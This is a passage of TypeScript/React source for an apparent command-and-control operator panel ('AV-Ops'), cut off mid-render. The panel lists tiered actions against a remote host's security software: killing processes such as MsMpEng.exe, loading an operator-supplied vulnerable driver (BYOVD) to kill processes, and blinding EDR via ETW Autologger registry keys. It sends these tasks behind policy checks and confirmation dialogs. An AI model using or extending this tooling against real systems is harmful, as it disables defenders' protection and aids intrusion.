/**
 * 杀软对抗（AV-Ops）面板 —— 分级目录 + 逐动作可用性 + 二次确认下发（v1.4.0 S6）。
 *
 * 这个面板的**主要价值是排障，而不是"给按钮"**：
 *   - 服务端 GET /sessions/{id}/av-ops 已经把"这个动作为什么不能下发"一次列全
 *     （`reasons[]`：机器可读 code + 中文说明），界面照实显示原因，
 *     而不是让操作员"发一次试试"（那正是服务端 S6 要消灭的行为）；
 *   - L3（BYOVD）要求"操作员自备的可用驱动"：没有就显示服务端的拒绝原因
 *     （`driver_unavailable`，例如"无 rw 档驱动"），**不给一个点了必然失败的按钮**；
 *   - L4 本批 `implemented=false` / `action_count=0`：只显示"暂无落地动作"，
 *     绝不渲染假入口；
 *   - L1 起是破坏性动作（destructive=true）：点击走**显式二次确认**弹层，
 *     里面照抄服务端的 impact 文案 + 目标 + "不可自动重试"提示，确认后才带
 *     `confirm:true` 下发。
 *
 * 字段口径见 web/src/api/index.ts 的 AV-Ops 段（逐字段与运行中的服务端核对过）：
 * 目录/会话 actions[] 里的 `impact` 是**字符串**（服务端动作表的如实文案）。
 */
import { useCallback, useEffect, useMemo, useState } from 'react'
import {
  AlertTriangle, CheckCircle2, Eye, Layers, Lock, RefreshCw, ShieldAlert, ShieldCheck, Skull, XCircle,
} from 'lucide-react'
import {
  avOpsApi, avOpsErrorMessage, avOpsFailure, avOpsHttpStatus, taskApi,
} from '../api'
import type {
  AVOpsAction, AVOpsCatalog, AVOpsCheck, AVOpsExecFailure, AVOpsExecResult,
  AVOpsParamHint, AVOpsPolicy, AVOpsReason, AVOpsReasonCode, AVOpsSessionAction, AVOpsSessionState,
} from '../api'
import type { Session } from '../types'
import { Badge, Callout, Card, Empty, Field, Section, Toolbar } from './ui'
import './AVOpsPanel.css'

/** 理由码 → 中文分类（服务端 message 已含完整说明，这里只做标题，便于一眼分辨）。 */
const REASON_LABEL: Record<AVOpsReasonCode, string> = {
  session_inactive: '会话不在线',
  tier_disabled: '等级被服务端配置关闭',
  confirmation_required: '下发需二次确认',
  capability_missing: '载荷缺该能力位',
  driver_unavailable: '驱动不可用',
  bad_request: '请求体不合法',
  unknown_action: '未知动作',
  unknown_tier: '未知等级',
  tier_mismatch: '等级与动作不符',
  params_invalid: '参数不合法',
  driver_selfcheck_failed: '驱动自检未通过',
  timeout_invalid: '超时取值非法',
  session_not_found: '会话不存在',
  task_create_failed: '创建任务失败',
  push_failed: '任务下发失败',
}

/** 这些原因属于"配置/环境"层面，配色上用警告色，提示"去改配置或补驱动"。 */
const BLOCKING_CODES: AVOpsReasonCode[] = ['tier_disabled', 'driver_unavailable', 'capability_missing']

/**
 * 硬阻塞原因（= 真的不能下发），把 `confirmation_required` 排除在外。
 *
 * ⚠️ 真机核对得出的关键口径：服务端的 `allowed` 字段是"reasons 为空"的意思，
 * 而 L1 起每个动作都会带一条 `confirmation_required`（"下发时必须带 confirm=true"）——
 * 所以 **L1 的 allowed=false 并不代表不可下发**，它只是说"必须走二次确认"。
 * 若界面按 allowed 直接禁用按钮，L1+ 就永远点不了（把二次确认误当成禁止）。
 * 因此这里区分"硬阻塞"与"需确认"，二次确认由本面板的确认弹层满足（confirm=true）。
 *
 * 导出是为了能被独立核对（这条口径很容易被误写成 `!allowed` 而让 L1+ 永远点不了）。
 */
export function hardBlocks(view: AVOpsSessionAction | null): AVOpsReason[] {
  if (!view) return []
  return view.reasons.filter((r) => r.code !== 'confirmation_required')
}

interface FetchErr {
  status: number
  message: string
}

interface ActionResult {
  action: string
  tierName: string
  result: AVOpsExecResult | null
  failure: AVOpsExecFailure | null
  /** 非结构化失败（老服务端纯文本 404 / 网络错误）的原文 */
  raw: string
  status: number
}

interface TaskView {
  id: number
  status: string
  output: string
  error: string
}

/** 取失败响应的统一描述（404 老服务端、403 权限、网络错误都能给出人话）。 */
function describeFetchError(kind: string, err: unknown): FetchErr {
  const status = avOpsHttpStatus(err)
  const detail = avOpsErrorMessage(err)
  if (status === 404) {
    return {
      status,
      message: `${kind} 接口返回 404：当前服务端没有 AV-Ops 分级入口（v1.4.0 S6 之前构建，或会话已被清理）。原文：${detail}`,
    }
  }
  if (status === 403) {
    return { status, message: `${kind} 接口返回 403：当前账号/API Key 无权访问 AV-Ops。原文：${detail}` }
  }
  return { status, message: status ? `${kind} 接口返回 ${status}：${detail}` : `${kind} 请求失败：${detail}` }
}

/** 按服务端的参数说明构造最小可用的 params（同时给出"缺什么"的清单）。
 *
 * 导出是为了能被独立调用核对（参数名一律来自服务端 params[] 说明，不在这里硬编码）；
 * 组件内是唯一调用点，界面上的输入框与下发请求共用这一份逻辑，不会漂移。 */
export function buildParams(
  action: AVOpsAction,
  values: Record<string, string>,
  driverB64: string,
): { params: Record<string, unknown>; missing: string[] } {
  const params: Record<string, unknown> = {}
  const missing: string[] = []
  const hints: AVOpsParamHint[] = action.params ?? []
  const required = new Set(action.required_params ?? [])

  for (const h of hints) {
    const raw = (values[h.name] ?? '').trim()
    if (h.name === 'driver_b64') {
      // 驱动字节由"选择 .sys"按钮读入 base64（粘贴整个 base64 进输入框不现实）
      const b64 = driverB64.trim()
      if (b64) params.driver_b64 = b64
      else if (h.required || required.has(h.name)) missing.push('driver_b64（选择操作员自备的 .sys）')
      continue
    }
    if (!raw) {
      if (h.required || required.has(h.name)) missing.push(h.name)
      continue
    }
    if (h.type === 'integer') {
      const n = Number(raw)
      if (!Number.isInteger(n) || n <= 0) {
        missing.push(`${h.name}（需正整数）`)
        continue
      }
      params[h.name] = n
    } else if (h.type === 'array') {
      const arr = raw.split(',').map((s) => s.trim()).filter(Boolean)
      if (arr.length === 0) {
        if (h.required || required.has(h.name)) missing.push(h.name)
        continue
      }
      params[h.name] = arr
    } else {
      params[h.name] = raw
    }
  }

  // 必填但服务端没给参数说明：面板渲染不出输入框 → 明确让操作员用 API 下发，
  // 而不是给一个点了必然报 params_invalid 的按钮。
  for (const r of action.required_params ?? []) {
    if (!(r in params) && !hints.some((h) => h.name === r)) missing.push(`${r}（服务端未给参数说明）`)
  }
  // byovd_kill 的 required_params 是空的，但服务端要求 pid 或 process_name 至少一个
  // （缺失会在 avopsDispatch 里以 params_invalid 拒绝）。
  if (action.name === 'byovd_kill' && params.pid === undefined && params.process_name === undefined) {
    missing.push('pid 或 process_name（至少给一个）')
  }
  return { params, missing: Array.from(new Set(missing)) }
}

/** params 的"这次会动什么"预览（用于二次确认弹层，措辞只描述将发送的取值）。 */
export function targetsPreview(action: AVOpsAction, params: Record<string, unknown>): string {
  const parts: string[] = []
  const pid = params.pid
  if (typeof pid === 'number') parts.push(`PID=${pid}`)
  const name = params.process_name
  if (typeof name === 'string' && name) parts.push(`进程名=${name}`)
  const svc = params.service_name
  if (typeof svc === 'string' && svc) parts.push(`内核服务名=${svc}`)
  const arr = params.processes
  if (Array.isArray(arr)) parts.push(`进程清单=${(arr as string[]).join(', ')}`)
  const iface = params.device
  if (typeof iface === 'string' && iface) parts.push(`驱动设备=${iface}`)
  if (typeof params.driver_b64 === 'string') parts.push(`driver_b64=已选驱动（${(params.driver_b64 as string).length} 字符 base64）`)
  if (parts.length === 0) return action.name === 'edr_blind' ? '目标会话进程自身 + 目标机的 ETW Autologger 注册表项' : '（本动作没有参数，按服务端登记的动作语义执行）'
  return parts.join(' · ')
}

export function AVOpsPanel({ session }: { session: Session }) {
  const [catalog, setCatalog] = useState<AVOpsCatalog | null>(null)
  const [state, setState] = useState<AVOpsSessionState | null>(null)
  const [catalogErr, setCatalogErr] = useState<FetchErr | null>(null)
  const [stateErr, setStateErr] = useState<FetchErr | null>(null)
  const [loading, setLoading] = useState(false)
  /** 每个动作的参数字符串值（action → paramName → 输入） */
  const [paramValues, setParamValues] = useState<Record<string, Record<string, string>>>({})
  /** 每个动作选中的驱动 base64（byovd_load 用） */
  const [driverB64, setDriverB64] = useState<Record<string, { name: string; b64: string }>>({})
  const [timeoutSec, setTimeoutSec] = useState('')
  const [pending, setPending] = useState<{ action: AVOpsAction; view: AVOpsSessionAction } | null>(null)
  const [busy, setBusy] = useState(false)
  const [result, setResult] = useState<ActionResult | null>(null)
  const [taskView, setTaskView] = useState<TaskView | null>(null)

  const load = useCallback(async () => {
    setLoading(true)
    const [cat, st] = await Promise.allSettled([avOpsApi.catalog(), avOpsApi.forSession(session.id)])
    if (cat.status === 'fulfilled') {
      setCatalog(cat.value.data)
      setCatalogErr(null)
    } else {
      setCatalog(null)
      setCatalogErr(describeFetchError('等级目录（GET /av-ops）', cat.reason))
    }
    if (st.status === 'fulfilled') {
      setState(st.value.data)
      setStateErr(null)
    } else {
      setState(null)
      setStateErr(describeFetchError('会话级判定（GET /sessions/{id}/av-ops）', st.reason))
    }
    setLoading(false)
  }, [session.id])

  useEffect(() => {
    setParamValues({})
    setDriverB64({})
    setPending(null)
    setResult(null)
    setTaskView(null)
    void load()
  }, [load])

  const policy: AVOpsPolicy | null = catalog?.policy ?? state?.policy ?? null

  // 超时输入：留空 = 用服务端默认；超上限时**提示并拦住**（服务端是直接拒绝，不截断）
  const timeout = useMemo(() => {
    const raw = timeoutSec.trim()
    if (!raw) return { value: undefined as number | undefined, error: '' }
    const n = Number(raw)
    if (!Number.isFinite(n) || !Number.isInteger(n) || n < 0) return { value: undefined, error: '需为非负整数（秒）' }
    const max = policy?.max_timeout_sec
    if (max && n > max) return { value: undefined, error: `超过上限 ${max} 秒：服务端会直接拒绝（不截断），请改小` }
    return { value: n, error: '' }
  }, [timeoutSec, policy])

  /** 会话级统计：按"硬阻塞"口径重算（服务端的 summary.allowed 不含"需二次确认"的动作）。 */
  const counts = useMemo(() => {
    const actions = state?.actions ?? []
    const ready = actions.filter((a) => hardBlocks(a).length === 0)
    return { total: actions.length, ready: ready.length, needConfirm: ready.filter((a) => !a.allowed).length }
  }, [state])

  /** 动作清单：目录在就用目录（含等级元数据），否则退回会话级清单。 */  const groups = useMemo(() => {
    const metaOf = (tier: string) => catalog?.tiers.find((t) => t.tier === tier) ?? null
    const tiers: string[] = catalog
      ? catalog.tiers.map((t) => t.tier)
      : Array.from(new Set((state?.actions ?? []).map((a) => a.tier)))
    return tiers.map((tier) => {
      const meta = metaOf(tier)
      const views = (state?.actions ?? []).filter((a) => a.tier === tier)
      const actions: AVOpsAction[] = views.length > 0 ? views : (meta?.actions ?? [])
      return { tier, meta, views, actions }
    })
  }, [catalog, state])

  const openConfirm = (action: AVOpsAction, view: AVOpsSessionAction) => {
    if (timeout.error) return
    const { missing } = buildParams(action, paramValues[action.name] ?? {}, driverB64[action.name]?.b64 ?? '')
    if (missing.length > 0) return
    // 破坏性动作（destructive）与需要确认的动作都走显式的二次确认弹层
    setPending({ action, view })
  }

  const exec = async (action: AVOpsAction, view: AVOpsSessionAction, confirm: boolean) => {
    const { params } = buildParams(action, paramValues[action.name] ?? {}, driverB64[action.name]?.b64 ?? '')
    setBusy(true)
    setResult(null)
    setTaskView(null)
    try {
      const r = await avOpsApi.exec(session.id, {
        action: action.name,
        tier: action.tier,
        confirm,
        ...(Object.keys(params).length > 0 ? { params } : {}),
        ...(timeout.value !== undefined ? { timeout_sec: timeout.value } : {}),
      })
      setResult({ action: action.name, tierName: r.data.tier_name, result: r.data, failure: null, raw: '', status: 200 })
    } catch (e) {
      setResult({
        action: action.name,
        tierName: action.tier + ' ' + (view.tier_name || ''),
        result: null,
        failure: avOpsFailure(e),
        raw: avOpsErrorMessage(e),
        status: avOpsHttpStatus(e),
      })
    } finally {
      setBusy(false)
      setPending(null)
    }
  }

  /** 拉取任务结果：复用既有任务结果通道（GET /api/v1/tasks/{id}，与杀软面板同一口径）。 */
  const pullTaskResult = useCallback(async (taskId: number) => {
    let view: TaskView = { id: taskId, status: 'unknown', output: '', error: '' }
    for (let i = 0; i < 12; i++) {
      try {
        const r = await taskApi.get(taskId)
        view = { id: taskId, status: r.data.status || 'unknown', output: r.data.output || '', error: r.data.error || '' }
        if (view.status === 'completed' || view.status === 'failed' || view.status === 'timeout') break
      } catch (e) {
        view = { id: taskId, status: 'unknown', output: '', error: avOpsErrorMessage(e) }
        break
      }
      await new Promise((res) => setTimeout(res, 1000))
    }
    setTaskView(view)
  }, [])

  const onDriverFile = (actionName: string, file: File | undefined) => {
    if (!file) return
    const reader = new FileReader()
    reader.onload = () => {
      const text = typeof reader.result === 'string' ? reader.result : ''
      const idx = text.indexOf(',')
      setDriverB64((prev) => ({ ...prev, [actionName]: { name: file.name, b64: idx >= 0 ? text.slice(idx + 1) : text } }))
    }
    reader.readAsDataURL(file)
  }

  const setParam = (actionName: string, key: string, value: string) => {
    setParamValues((prev) => ({ ...prev, [actionName]: { ...(prev[actionName] ?? {}), [key]: value } }))
  }

  const renderChecks = (checks: AVOpsCheck[]) => (
    <ul className="avops-checks">
      {checks.map((c) => (
        <li key={`${c.step}-${c.name}`} className={`avops-check ${c.ok ? '' : 'avops-check--fail'}`}>
          {c.ok ? <CheckCircle2 size={13} /> : <XCircle size={13} />}
          <span className="avops-check-step">第 {c.step} 步</span>
          <span className="avops-check-name">{c.name}</span>
          {!c.ok && c.code && <code className="avops-code">{c.code}</code>}
          <span className="avops-check-detail">{c.detail}</span>
        </li>
      ))}
    </ul>
  )

  // ── 等级目录整体不可用（老服务端 404 / 权限不足）：说明清楚，不要白屏 ──
  if (catalogErr && !catalog && !state) {
    return (
      <div className="avops-panel">
        <Callout tone="warn" title="AV-Ops 面板不可用">
          {catalogErr.message}
        </Callout>
        <Empty
          icon={<ShieldAlert size={34} />}
          title="当前服务端没有杀软对抗分级入口"
          desc="AV-Ops（GET /api/v1/av-ops、GET /api/v1/sessions/{id}/av-ops）是 v1.4.0 S6 新增的接口。此服务端要么是更早的构建（接口 404），要么当前账号无权访问（403）。请升级服务端或改用有权限的账号；既有「杀软」面板的裸链（无分级、无前置检查、不写审计）仍然可用。"
        />
      </div>
    )
  }

  const l4NoteShown = groups.some((g) => g.meta && !g.meta.implemented)

  return (
    <div className="avops-panel">
      {/* 诚实提示：这是"能做多狠"的分级目录，不是免杀功能 */}
      <Callout tone="info" title="这是能力分级目录，不是免杀功能">
        这里只回答"这台服务端现在允许做到哪一级、对这台主机每个动作能不能下发"，不改变载荷本身的免杀效果。
        分级语义：L0 侦察只读（默认开、无需确认）· L1 用户态温和（默认开，但**破坏性、需二次确认**）·
        L2 强 / L3 BYOVD / L4 检测面抑制**默认关闭**（由服务端配置决定，界面只回显）。
        <div className="avops-dim">
          不可用的动作会直接显示服务端给出的原因（配置未开 / 无驱动 / 能力位缺失 / 会话不在线），不必"发一次试试"。
        </div>
      </Callout>

      <Toolbar>
        <span className="avops-title">
          <Layers size={15} /> 对抗分级（AV-Ops）
          {state && (
            <span className="avops-dim">
              可下发 {counts.ready} / {counts.total} 个动作
              {counts.needConfirm > 0 ? `（其中 ${counts.needConfirm} 个需二次确认后下发）` : ''}
            </span>
          )}
        </span>
        <span style={{ flex: 1 }} />
        <button className="btn-small" onClick={() => void load()} disabled={loading}>
          <RefreshCw size={13} className={loading ? 'spin' : ''} /> 刷新判定
        </button>
      </Toolbar>

      {/* 策略回显（来自 GET /av-ops 的 policy） */}
      {policy && (
        <div className="avops-policy">
          <span className="avops-policy-item">
            <span className="avops-dim">L2 强</span>
            <Badge tone={policy.allow_l2 ? 'ok' : 'danger'}>{policy.allow_l2 ? '已开启' : '默认关闭'}</Badge>
          </span>
          <span className="avops-policy-item">
            <span className="avops-dim">L3 BYOVD</span>
            <Badge tone={policy.allow_l3 ? 'ok' : 'danger'}>{policy.allow_l3 ? '已开启' : '默认关闭'}</Badge>
          </span>
          <span className="avops-policy-item">
            <span className="avops-dim">L4 检测面抑制</span>
            <Badge tone={policy.allow_l4 ? 'ok' : 'danger'}>{policy.allow_l4 ? '已开启' : '默认关闭'}</Badge>
          </span>
          <span className="avops-policy-item">
            <span className="avops-dim">二次确认</span>
            <Badge tone={policy.require_confirm ? 'ok' : 'warn'}>{policy.require_confirm ? '强制' : '服务端已放宽'}</Badge>
          </span>
          <span className="avops-policy-item">
            <span className="avops-dim">超时</span>
            <span className="avops-mono">默认 {policy.default_timeout_sec}s / 上限 {policy.max_timeout_sec}s</span>
          </span>
        </div>
      )}

      {/* BYOVD 档位现状：L3 排障的第一现场（驱动由操作员自备，项目不内置） */}
      {state?.driver && (
        <div className="avops-driver">
          <Lock size={13} />
          <span className="avops-dim">驱动档位</span>
          <Badge tone={state.driver.kill_available ? 'ok' : 'default'}>
            kill 档 {state.driver.kill_available ? '有' : '无'}
          </Badge>
          <Badge tone={state.driver.rw_available ? 'ok' : 'default'}>
            rw 档 {state.driver.rw_available ? '有' : '无'}
          </Badge>
          <span className="avops-mono avops-dim">
            目录内共 {state.driver.total} 个 .sys{state.driver.search_dirs?.length ? `（${state.driver.search_dirs.join(' 或 ')}）` : ''}
          </span>
        </div>
      )}

      {stateErr && (
        <Callout tone="warn" title="会话级判定不可用">
          {stateErr.message}
          <div className="avops-dim">
            下面只显示等级目录（服务端允许到哪一级）。要判断"对这台会话能不能下发"，需要会话级判定接口可用。
          </div>
        </Callout>
      )}
      {catalogErr && catalog && (
        <Callout tone="warn" title="等级目录回显不可用（已退回会话级清单）">
          {catalogErr.message}
        </Callout>
      )}
      {state?.capability_note && (
        <Callout tone="warn" title="能力清单是 OS 兜底推导的">
          {state.capability_note}
        </Callout>
      )}

      {/* 超时：留空 = 服务端默认 */}
      <Field
        label="本次下发的显式超时（秒）"
        hint={
          policy
            ? `留空 = 用服务端默认 ${policy.default_timeout_sec} 秒；上限 ${policy.max_timeout_sec} 秒（超过会被服务端直接拒绝，不会截断）。到点仍无结果时服务端把任务置为 timeout 终态。`
            : '留空 = 用服务端默认值。'
        }
        error={timeout.error}
        style={{ maxWidth: 360 }}
      >
        <input
          type="number"
          min={0}
          className="ui-input"
          value={timeoutSec}
          onChange={(e) => setTimeoutSec(e.target.value)}
          placeholder={policy ? String(policy.default_timeout_sec) : '默认'}
        />
      </Field>

      {/* 按等级分组 */}
      {groups.map(({ tier, meta, views, actions }) => {
        const implemented = meta ? meta.implemented : actions.length > 0
        return (
          <Card
            key={tier}
            className="avops-tier"
            icon={tier === 'L0' ? <Eye size={15} /> : meta?.read_only ? <Eye size={15} /> : <Skull size={15} />}
            title={meta?.name ?? views[0]?.tier_name ?? tier}
            subtitle={meta?.description}
            actions={
              <>
                {meta?.read_only && <Badge tone="ok">只读</Badge>}
                {meta && !meta.read_only && meta.destructive && <Badge tone="danger">破坏性</Badge>}
                {meta?.needs_confirm && <Badge tone="warn">需二次确认</Badge>}
                {meta?.no_auto_retry && <Badge tone="warn">不可自动重试</Badge>}
                <Badge tone={meta ? (meta.allowed ? 'ok' : 'danger') : 'default'}>
                  等级{meta ? (meta.allowed ? '已允许' : '被关闭') : '判定未知'}
                </Badge>
              </>
            }
          >
            {meta && !meta.allowed && meta.denied_reason && (
              <div className="avops-tier-denied">
                <AlertTriangle size={13} /> {meta.denied_reason}
              </div>
            )}

            {/* L4：本批没有任何落地动作 —— 只说明，不给任何可点的入口 */}
            {!implemented && (
              <div className="avops-noaction">
                <Badge tone="default">暂无落地动作</Badge>
                <span>
                  该等级当前 <code className="avops-code">implemented=false</code>、
                  <code className="avops-code">action_count={meta?.action_count ?? 0}</code>
                  ：服务端没有登记任何可下发动作，所以这里没有按钮可点（即使把配置打开也不会变）。
                </span>
                {meta?.note && <div className="avops-dim">{meta.note}</div>}
              </div>
            )}

            {implemented && actions.length === 0 && (
              <Empty title="该等级没有动作" desc="服务端目录里这一级没有任何登记动作。" />
            )}

            {actions.map((a) => {
              const view = views.find((v) => v.name === a.name) ?? null
              const values = paramValues[a.name] ?? {}
              const { missing } = buildParams(a, values, driverB64[a.name]?.b64 ?? '')
              const confirmNeeded = a.needs_confirm || a.destructive
              const blocks = hardBlocks(view)
              const blocked = view ? blocks.length > 0 : false
              const needConfirmOnly = !!view && !blocked && !view.allowed
              const hints = a.params ?? []
              const disableReason = blocked
                ? '服务端判定该动作当前不可用，原因见下方'
                : missing.length > 0
                  ? `缺少参数：${missing.join('、')}`
                  : timeout.error
                    ? timeout.error
                    : ''
              return (
                <div key={a.name} className={`avops-action ${blocked ? 'avops-action--blocked' : ''}`}>
                  <div className="avops-action-head">
                    <span className="avops-action-name">{a.name}</span>
                    <span className="avops-dim">{view?.tier_name ?? `${a.tier} ${meta?.name ?? ''}`}</span>
                    <Badge tone="default">{a.task_type}</Badge>
                    {a.destructive ? <Badge tone="danger">破坏性</Badge> : <Badge tone="ok">只读</Badge>}
                    {a.needs_confirm ? <Badge tone="warn">需确认</Badge> : <Badge tone="default">无需确认</Badge>}
                    {a.auto_retry ? (
                      <Badge tone="default">可自动重投递</Badge>
                    ) : (
                      <Badge tone="warn">不可自动重试</Badge>
                    )}
                    {/* allowed=false + 只有 confirmation_required 原因 ≠ 不可下发：那种情况显示成"需二次确认" */}
                    {view &&
                      (blocked ? (
                        <Badge tone="danger">不可下发</Badge>
                      ) : needConfirmOnly ? (
                        <Badge tone="warn">二次确认后可下发</Badge>
                      ) : (
                        <Badge tone="ok">可下发</Badge>
                      ))}
                  </div>
                  <div className="avops-action-summary">{a.summary}</div>

                  {/* 服务端给的阻塞原因（本面板的主要价值：排障而不是试） */}
                  {view && view.reasons.length > 0 && (
                    <ul className="avops-reasons">
                      {view.reasons.map((r) => (
                        <li
                          key={`${a.name}-${r.code}`}
                          className={`avops-reason ${BLOCKING_CODES.includes(r.code) ? 'avops-reason--blocking' : ''}`}
                        >
                          <code className="avops-code">{r.code}</code>
                          <strong>{REASON_LABEL[r.code] ?? r.code}</strong>
                          <span>{r.message}</span>
                          {r.code === 'confirmation_required' && (
                            <span className="avops-dim">
                              （这不是"不可用"：本面板下发前会走二次确认并自动带上 confirm=true）
                            </span>
                          )}
                        </li>
                      ))}
                    </ul>
                  )}

                  {/* 影响评估（服务端动作表的如实文案） */}
                  <details className="avops-impact">
                    <summary>影响评估（服务端原文）</summary>
                    <div>{a.impact}</div>
                  </details>

                  {/* 参数：按服务端的 params[] 渲染最小可用输入 */}
                  {hints.length > 0 && (
                    <div className="avops-params">
                      {hints.map((h) => (
                        <Field
                          key={h.name}
                          label={`${h.name}${h.required || (a.required_params ?? []).includes(h.name) ? ' *' : ''}`}
                          hint={h.description}
                          style={{ minWidth: 200 }}
                        >
                          {h.name === 'driver_b64' ? (
                            <div className="avops-driver-pick">
                              <label className="btn-small">
                                选择 .sys（op自备）
                                <input
                                  type="file"
                                  accept=".sys"
                                  style={{ display: 'none' }}
                                  onChange={(e) => onDriverFile(a.name, e.target.files?.[0])}
                                />
                              </label>
                              <span className="avops-dim">
                                {driverB64[a.name]
                                  ? `${driverB64[a.name].name}（base64 ${driverB64[a.name].b64.length} 字符）`
                                  : '未选择（必填；也可直接用 API 下发）'}
                              </span>
                            </div>
                          ) : h.type === 'array' ? (
                            <input
                              type="text"
                              className="ui-input"
                              value={values[h.name] ?? ''}
                              onChange={(e) => setParam(a.name, h.name, e.target.value)}
                              placeholder="逗号分隔，如 MsMpEng.exe, 360tray.exe"
                            />
                          ) : h.type === 'integer' ? (
                            <input
                              type="number"
                              className="ui-input"
                              value={values[h.name] ?? ''}
                              onChange={(e) => setParam(a.name, h.name, e.target.value)}
                              placeholder="正整数"
                            />
                          ) : (
                            <input
                              type="text"
                              className="ui-input"
                              value={values[h.name] ?? ''}
                              onChange={(e) => setParam(a.name, h.name, e.target.value)}
                              placeholder={h.name}
                            />
                          )}
                        </Field>
                      ))}
                    </div>
                  )}

                  <div className="avops-dispatch">
                    {(a.required_params ?? []).length > 0 && !(a.params ?? []).length && (
                      <span className="avops-warn-text">
                        <AlertTriangle size={12} /> 该动作需要参数（{a.required_params?.join('、')}），但服务端没有给出参数说明：
                        本面板无法生成合法请求，请用 API 直接下发。
                      </span>
                    )}
                    {missing.length > 0 && !blocked && (
                      <span className="avops-warn-text">
                        <AlertTriangle size={12} /> 还缺：{missing.join('、')}
                      </span>
                    )}
                    <button
                      className={`btn-small ${a.destructive ? 'danger' : 'btn-primary'}`}
                      disabled={blocked || missing.length > 0 || !!timeout.error || busy || !view}
                      title={disableReason || (confirmNeeded ? '需二次确认' : 'L0 只读，可直接下发')}
                      onClick={() => (confirmNeeded ? openConfirm(a, view as AVOpsSessionAction) : void exec(a, view as AVOpsSessionAction, false))}
                    >
                      {confirmNeeded ? <ShieldAlert size={13} /> : <ShieldCheck size={13} />}
                      {confirmNeeded ? '二次确认后下发' : '下发（只读）'}
                    </button>
                    {!view && <span className="avops-warn-text">会话级判定不可用：无法确认该动作当前是否允许下发。</span>}
                  </div>
                </div>
              )
            })}
          </Card>
        )
      })}

      {/* 服务端口径说明（notes 原样展示，含 L4 无动作与 MCP 不暴露 L1+ 的口径） */}
      {catalog?.notes && catalog.notes.length > 0 && (
        <Section title="服务端口径说明" defaultOpen={false}>
          <ul className="avops-notes">
            {catalog.notes.map((n) => (
              <li key={n}>{n}</li>
            ))}
          </ul>
          {catalog.probe_hint && <div className="avops-dim">{catalog.probe_hint}</div>}
        </Section>
      )}
      {l4NoteShown && catalog?.action_count !== undefined && (
        <div className="avops-dim">
          目录共 {catalog.action_count} 个已登记动作；"没有落地动作"的等级是服务端如实标注的
          （<code className="avops-code">implemented=false</code>），打开对应配置也不会让它变成可下发。
        </div>
      )}

      {/* ── 二次确认弹层：破坏性动作的唯一入口 ── */}
      {pending && (
        <div className="avops-modal" role="dialog" aria-modal="true">
          <div className="avops-modal-card">
            <div className="avops-modal-head">
              <ShieldAlert size={16} />
              <strong>二次确认：{pending.action.name}</strong>
              <Badge tone="danger">{pending.view.tier_name || pending.action.tier}</Badge>
              {pending.action.destructive && <Badge tone="danger">破坏性</Badge>}
            </div>

            <Callout tone="danger" title="你会对目标机执行的动作（服务端影响评估原文）">
              {pending.action.impact}
            </Callout>

            <div className="avops-modal-row">
              <span className="avops-dim">本次目标</span>
              <span>{targetsPreview(pending.action, buildParams(pending.action, paramValues[pending.action.name] ?? {}, driverB64[pending.action.name]?.b64 ?? '').params)}</span>
            </div>
            <div className="avops-modal-row">
              <span className="avops-dim">动作说明</span>
              <span>{pending.action.summary}</span>
            </div>
            <div className="avops-modal-row">
              <span className="avops-dim">显式超时</span>
              <span className="avops-mono">
                {timeout.value !== undefined ? `${timeout.value} 秒` : `服务端默认（${policy?.default_timeout_sec ?? '—'} 秒）`}
              </span>
            </div>

            {!pending.action.auto_retry && (
              <Callout tone="danger" title="不可自动重试">
                下发后若超时/断线/丢结果，服务端**不会**自动重发（重发 = 再执行）。如确认未执行，请重新下发
                （会分配**新的** task_id）。请先核对目标机现状再决定是否重发。
              </Callout>
            )}
            <Callout tone="warn" title="不可回滚">
              该动作造成的改动不会自动回滚（结束的进程不会自动恢复、注册表改动/已加载的驱动不会自动还原），
              请确认这是授权范围内、且目标与预期一致。
            </Callout>

            <div className="avops-modal-actions">
              <button className="btn-small" onClick={() => setPending(null)} disabled={busy}>
                取消
              </button>
              <button
                className="btn-small danger"
                disabled={busy}
                onClick={() => void exec(pending.action, pending.view, true)}
              >
                {busy ? '下发中…' : `确认下发（带 confirm=true）`}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ── 下发结果 ── */}
      {result && (
        <Card
          className="avops-result"
          title={`下发结果：${result.action}`}
          actions={<Badge tone={result.result ? 'ok' : 'danger'}>{result.result ? '已下发' : `失败 ${result.status || ''}`}</Badge>}
        >
          {result.result ? (
            <>
              <div className="avops-result-line">
                <span className="avops-dim">task_id</span>
                <code className="avops-code">{result.result.task_id}</code>
                <span className="avops-dim">任务类型</span>
                <code className="avops-code">{result.result.task_type}</code>
                <Badge tone="default">{result.result.tier_name}</Badge>
                {result.result.destructive && <Badge tone="danger">破坏性</Badge>}
                {result.result.confirmed && <Badge tone="ok">已确认</Badge>}
                {!result.result.auto_retry && <Badge tone="warn">不可自动重试</Badge>}
              </div>
              <div className="avops-result-line avops-dim">{result.result.message}</div>
              <div className="avops-result-line">
                <span className="avops-dim">影响</span>
                <span>{result.result.impact.summary}</span>
              </div>
              {result.result.impact.targets && (
                <div className="avops-result-line">
                  <span className="avops-dim">目标</span>
                  <span>{result.result.impact.targets}</span>
                </div>
              )}
              {result.result.impact.irreversible_note && (
                <div className="avops-warn-text">
                  <AlertTriangle size={12} /> {result.result.impact.irreversible_note}
                </div>
              )}
              <div className="avops-dim">前置检查（checks[]，逐步）：</div>
              {renderChecks(result.result.checks)}
              {result.result.warnings && result.result.warnings.length > 0 && (
                <ul className="avops-warnings">
                  {result.result.warnings.map((w) => (
                    <li key={w}>
                      <AlertTriangle size={12} /> {w}
                    </li>
                  ))}
                </ul>
              )}
              <div className="avops-taskview">
                <div className="avops-dim">
                  结果走既有任务结果通道（<code className="avops-code">GET /api/v1/tasks/{result.result.task_id}</code>；
                  「时间线」页也能看到同一批任务）。破坏性任务超时/丢结果时服务端不会自动重发，需要时请核对后重新下发。
                </div>
                <button className="btn-small" onClick={() => void pullTaskResult((result.result as AVOpsExecResult).task_id)}>
                  <RefreshCw size={13} /> 拉取任务结果
                </button>
                {taskView && (
                  <div className="avops-taskresult">
                    <span className="avops-dim">任务 #{taskView.id}</span>
                    <Badge tone={taskView.status === 'completed' ? 'ok' : taskView.status === 'failed' || taskView.status === 'timeout' ? 'danger' : 'warn'}>
                      {taskView.status}
                    </Badge>
                    {taskView.output && <pre>{taskView.output}</pre>}
                    {taskView.error && <pre className="avops-taskresult-err">{taskView.error}</pre>}
                    {!taskView.output && !taskView.error && <span className="avops-dim">（暂无输出：任务可能仍在执行，或该动作成功时本就没有输出）</span>}
                  </div>
                )}
              </div>
            </>
          ) : (
            <>
              <div className="avops-result-line">
                <span className="avops-dim">动作</span>
                <code className="avops-code">{result.action}</code>
                <span className="avops-dim">{result.tierName}</span>
